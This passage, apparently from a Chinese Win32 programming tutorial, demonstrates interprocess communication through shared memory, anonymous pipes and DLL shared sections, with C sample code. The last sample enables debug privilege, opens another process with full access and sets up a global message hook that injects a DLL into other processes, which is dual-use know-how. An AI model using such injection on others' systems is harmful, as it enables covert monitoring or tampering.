<td>将用户模式异步过程调用（APC）对象添加到指定线程的 <code>APC</code> 队列中</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>_wtoi / _ttoi  / _itow / _itot</td>
<td>宽字节字符串与数字间转换</td>
</tr>
<tr>
<td>wcstombs</td>
<td><code>Unicode</code> 转 <code>ANSI</code></td>
</tr>
<tr>
<td>mbstowcs</td>
<td><code>ANSI</code> 转 <code>Unicode</code></td>
</tr>
</tbody></table>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><p>由于进程间的虚拟内存空间的相对独立的，如果想要实现进程间的通信，则需要通过特殊的途径实现。</p>
<h4 id="自定义消息"><a href="#自定义消息" class="headerlink" title="自定义消息"></a>自定义消息</h4><p>对于 <code>Windows</code> 程序而言，其工作机制是基于消息基址实现的，而且系统会有一个系统消息队列用于接收所有进程的消息，通过窗口（控件）句柄分发给特定的进程。因此，我们可以通过消息机制，向特定进程发送消息，以实现进程间的通信。</p>
<p>但是，当我们向通过句柄向特定进程发送系统定义的消息时， 目标进程中可能存在该消息的处理函数，其处理函数的逻辑必然与我们想要实现的不同，这同样无法达到我们的目的。</p>
<p>因此，我们可以通过自定义消息，这样就可以避免被目标进程按照其原本的逻辑处理。我们可以通过 <code>Windows AIP</code> 函数向目标进程中注入消息处理函数，以实现目标进程接收我们自定义的消息，并按照我们定义的消息处理函数进行消息处理。</p>
 <!-- 详情见, 恶意代码-Hook-Global Hook -->



<h4 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h4><p>我们可以通过 <code>CreateFileMapping</code> 申请一块共享内存，并通过 <code>MapViewOfFile</code> 函数将共享内存对象映射进进程的内存空间，以实现进程间的消息通信。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateSharedMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;				</span><br><span class="line">	<span class="comment">//创建FileMapping对象					</span></span><br><span class="line">	hMapObject = CreateFileMapping((HANDLE)<span class="number">0xFFFFFFFF</span>,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,<span class="number">0x1000</span>,TEXT(<span class="string">&quot;shared&quot;</span>));					</span><br><span class="line">	<span class="keyword">if</span>(!hMapObject)									</span><br><span class="line">		<span class="keyword">return</span> FALSE;				</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//将FileMapping对象映射到自己的进程					</span></span><br><span class="line">	lpszSharedBuff = MapViewOfFile(hMapObject,FILE_MAP_WRITE,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);					</span><br><span class="line">	<span class="keyword">if</span>(!lpszSharedBuff)								</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	</span><br><span class="line">	sm = lpszSharedBuff;</span><br><span class="line">	sm-&gt;dwBuffMax = <span class="number">0x100</span>;</span><br><span class="line">	sm-&gt;lpszBuff = (LPSTR)((DWORD)lpszSharedBuff+<span class="number">12</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Write</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(sm-&gt;dwBuffMax &lt; dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(sm-&gt;lpszBuff, g_dwBuffMax);</span><br><span class="line">	<span class="built_in">memcpy</span>(sm-&gt;lpszBuff, lpszBuff, dwBuffLen);</span><br><span class="line">	sm-&gt;dwBuffLen = dwBuffLen;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">Read</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dwBuffLen &lt; sm-&gt;dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	ZeroMemory(lpszBuff, dwBuffLen);</span><br><span class="line">	<span class="built_in">memcpy</span>(lpszBuff, sm-&gt;lpszBuff, sm-&gt;dwBuffLen);</span><br><span class="line">	<span class="keyword">return</span> sm-&gt;dwBuffLen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="匿名管道"><a href="#匿名管道" class="headerlink" title="匿名管道"></a>匿名管道</h4><p>我们可以通过创建匿名管道实现进程间的通信，但是进程间的通信方式是建立在父进程与子进程的关系上。</p>
<p>测试代码如下：</p>
<p><strong>父进程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hRead;										</span><br><span class="line">	HANDLE hWrite;</span><br><span class="line">	CHAR szBuff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">											</span><br><span class="line">	SECURITY_ATTRIBUTES sa;										</span><br><span class="line">											</span><br><span class="line">	sa.bInheritHandle = TRUE;										</span><br><span class="line">	sa.lpSecurityDescriptor = <span class="literal">NULL</span>;										</span><br><span class="line">	sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);										</span><br><span class="line">											</span><br><span class="line">	<span class="keyword">if</span>(!CreatePipe(&amp;hRead,&amp;hWrite,&amp;sa,<span class="number">0</span>))										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="number">0</span>,TEXT(<span class="string">&quot;创建匿名管道失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">											</span><br><span class="line">	STARTUPINFO si;										</span><br><span class="line">	PROCESS_INFORMATION pi;										</span><br><span class="line">											</span><br><span class="line">	ZeroMemory(&amp;si,<span class="keyword">sizeof</span>(STARTUPINFO));										</span><br><span class="line">											</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);										</span><br><span class="line">	si.dwFlags = STARTF_USESTDHANDLES;										</span><br><span class="line">	si.hStdInput = hRead;										</span><br><span class="line">	si.hStdOutput = hWrite;										</span><br><span class="line">	si.hStdError = GetStdHandle(STD_ERROR_HANDLE);										</span><br><span class="line">											</span><br><span class="line">	<span class="keyword">if</span>(!CreateProcess(<span class="string">&quot;C:\\vc6++\\MyProjects\\1\\Debug\\1.exe&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi))										</span><br><span class="line">	&#123;										</span><br><span class="line">		CloseHandle(hRead);									</span><br><span class="line">		CloseHandle(hWrite);									</span><br><span class="line">		hRead = <span class="literal">NULL</span>;									</span><br><span class="line">		hWrite = <span class="literal">NULL</span>;									</span><br><span class="line">		MessageBox(<span class="number">0</span>,TEXT(<span class="string">&quot;创建子进程失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">	<span class="keyword">else</span>										</span><br><span class="line">	&#123;										</span><br><span class="line">		CloseHandle(pi.hProcess);									</span><br><span class="line">		CloseHandle(pi.hThread);									</span><br><span class="line">	&#125;																				</span><br><span class="line">											</span><br><span class="line">	<span class="comment">//写数据	</span></span><br><span class="line">	LPSTR lpszBuff = <span class="string">&quot;haha,walker!&quot;</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(szBuff, lpszBuff, <span class="built_in">strlen</span>(lpszBuff));										</span><br><span class="line">	DWORD dwWrite;										</span><br><span class="line">	<span class="keyword">if</span>(!WriteFile(hWrite,szBuff,<span class="built_in">strlen</span>(szBuff)+<span class="number">1</span>,&amp;dwWrite,<span class="literal">NULL</span>))										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="number">0</span>,TEXT(<span class="string">&quot;写数据失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">		</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="comment">//读数据													</span></span><br><span class="line">	DWORD dwRead;										</span><br><span class="line">	<span class="keyword">if</span>(!ReadFile(hRead,szBuff,<span class="number">100</span>,&amp;dwRead,<span class="literal">NULL</span>))										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;读取数据失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">	<span class="keyword">else</span>										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,szBuff,TEXT(<span class="string">&quot;[读取数据]&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>子进程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//初始化										</span></span><br><span class="line">	HANDLE hRead = GetStdHandle(STD_INPUT_HANDLE);										</span><br><span class="line">	HANDLE hWrite = GetStdHandle(STD_OUTPUT_HANDLE);  										</span><br><span class="line">											</span><br><span class="line">	<span class="comment">//读数据										</span></span><br><span class="line">	TCHAR szBuffer[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;										</span><br><span class="line">	DWORD dwRead;										</span><br><span class="line">	<span class="keyword">if</span>(!ReadFile(hRead,szBuffer,<span class="number">100</span>,&amp;dwRead,<span class="literal">NULL</span>))										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;读取数据失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">	<span class="keyword">else</span>										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,szBuffer,TEXT(<span class="string">&quot;[读取数据]&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;										</span><br><span class="line">											</span><br><span class="line">	<span class="comment">//写数据										</span></span><br><span class="line">	<span class="built_in">memcpy</span>(szBuffer, <span class="string">&quot;匿名管道&quot;</span>, <span class="number">0x10</span>);										</span><br><span class="line">	DWORD dwWrite;										</span><br><span class="line">	<span class="keyword">if</span>(!WriteFile(hWrite,szBuffer,<span class="built_in">strlen</span>(szBuffer)+<span class="number">1</span>,&amp;dwWrite,<span class="literal">NULL</span>))										</span><br><span class="line">	&#123;										</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;写入数据失败!&quot;</span>),TEXT(<span class="string">&quot;Error&quot;</span>),MB_OK);									</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32/image-20210224163806885.png" alt="image-20210224163806885" style="zoom:80%;" align="left">



<img src="/win32/Win32/image-20210224163841852.png" alt="image-20210224163841852" style="zoom:80%;" align="left">



<h4 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h4><!-- 略 -->



<h4 id="Dll共享节"><a href="#Dll共享节" class="headerlink" title="Dll共享节"></a>Dll共享节</h4><p>我们可以在 <code>Dll</code> 中申请一个共享节，当进程加载该 <code>Dll</code> 文件后，不同进程都可以实现对该共享节内存的读写，以此实现进程间的数据共享。其中，共享节的申请方式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.shared&quot;</span>)</span></span><br><span class="line"><span class="comment">/* 全局变量, 必须初始化 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/section:.shared,rws&quot;</span>)	<span class="comment">// 声明该共享节的属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以使用以下方式定义全局变量, 必须初始化</span></span><br><span class="line"><span class="comment">//__declspec(allocate(&quot;Shared&quot;))LPSTR lpszName = &quot;walker&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局变量、函数的简便导出方法是在 *.def 文件中直接添加函数声明即可, 不必初始化。</span></span><br><span class="line"><span class="comment">	在程序调用时, 和函数调用一样, 使用 GetProcAddress 函数得到变量地址。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，一般我们会将 <code>Dll</code> 中的全局变量封装在函数中进行操作，而不会直接导出。</p>
<img src="/win32/Win32/image-20210225154836498.png" alt="image-20210225154836498" style="zoom:80%;" align="left">

<p>可以看到，此时<code>.shared</code> 段已经具有可读、可写、可执行的权限。</p>
<p><strong>存在哪些坑？</strong></p>
<p><strong>即使Dll共享节中的变量被放在声明中，但是它们必须初始化，否则编译器会将之当作普通变量进行编译，即无法实现Dll共享节！</strong></p>
<hr>
<p>测试代码如下：</p>
<p><strong>Dll</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> HMODULE g_hModuleOfDll;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;shared&quot;</span>)</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_szBuff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">DWORD g_dwBuffLen = <span class="number">0</span>;</span><br><span class="line">DWORD g_dwBuffMax = <span class="keyword">sizeof</span>(g_szBuff);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/section:shared,rws&quot;</span>)</span></span><br><span class="line">BYTE szBuff[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提权函数：提升为DEBUG权限 (貌似没什么作用)</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fOk = FALSE;</span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="keyword">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Write</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(g_dwBuffMax &lt; dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(g_szBuff, g_dwBuffMax);</span><br><span class="line">	<span class="built_in">memcpy</span>(g_szBuff, lpszBuff, dwBuffLen);</span><br><span class="line">	g_dwBuffLen = dwBuffLen;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">Read</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dwBuffLen &lt; g_dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	ZeroMemory(lpszBuff, dwBuffLen);</span><br><span class="line">	<span class="built_in">memcpy</span>(lpszBuff, g_szBuff, g_dwBuffLen);</span><br><span class="line">	<span class="keyword">return</span> g_dwBuffLen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetWindowThreadID</span><span class="params">(LPSTR lpszWindowName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThreadSnap = <span class="literal">NULL</span>;	<span class="comment">// 模块快照</span></span><br><span class="line">	DWORD th32ThreadID = <span class="number">0</span>;</span><br><span class="line">	DWORD dwPid = <span class="number">0x00</span>;</span><br><span class="line">	THREADENTRY32 thread32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BOOL bMoreOfThread;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取进程句柄</span></span><br><span class="line">	HWND hwnd = FindWindow(<span class="literal">NULL</span>, lpszWindowName);</span><br><span class="line">	<span class="keyword">if</span> (!hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;获取进程句柄失败！\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	GetWindowThreadProcessId(hwnd, &amp;dwPid);</span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取线程ID</span></span><br><span class="line">	thread32.dwSize = <span class="keyword">sizeof</span>(thread32);</span><br><span class="line"></span><br><span class="line">	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;获取线程信息失败！\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bMoreOfThread = Thread32First(hThreadSnap, &amp;thread32);</span><br><span class="line">	<span class="keyword">while</span> (bMoreOfThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (thread32.th32OwnerProcessID == dwPid)</span><br><span class="line">		&#123;</span><br><span class="line">			th32ThreadID = thread32.th32ThreadID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bMoreOfThread = Thread32Next(hThreadSnap, &amp;thread32);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThreadSnap);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT <span class="title">MessageProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> nCode,</span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nCode == HC_ACTION)</span><br><span class="line">	&#123;</span><br><span class="line">		PCWPSTRUCT pcw = (PCWPSTRUCT)lParam;</span><br><span class="line">		<span class="keyword">if</span> (pcw-&gt;message == WM_USER + <span class="number">0x1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			OutputDebugString(<span class="string">&quot;receive data: &quot;</span>);</span><br><span class="line">			OutputDebugString(g_szBuff);</span><br><span class="line">			OutputDebugString(<span class="string">&quot;------\n&quot;</span>);</span><br><span class="line">			ZeroMemory(szBuff, <span class="keyword">sizeof</span>(szBuff));</span><br><span class="line">			<span class="built_in">sprintf</span>(szBuff, <span class="string">&quot;wParam: %d\nlParam: %d\nPID: %d\n&quot;</span>, pcw-&gt;wParam, pcw-&gt;lParam,GetCurrentProcessId());</span><br><span class="line">			<span class="comment">//MessageBoxA(0, szBuff, &quot;接收到自定义消息&quot;, 0);</span></span><br><span class="line">			OutputDebugString(szBuff);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//return TRUE;</span></span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置全局钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetGlobalHook</span><span class="params">(<span class="keyword">int</span> idHook, LPSTR lpszWindowName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 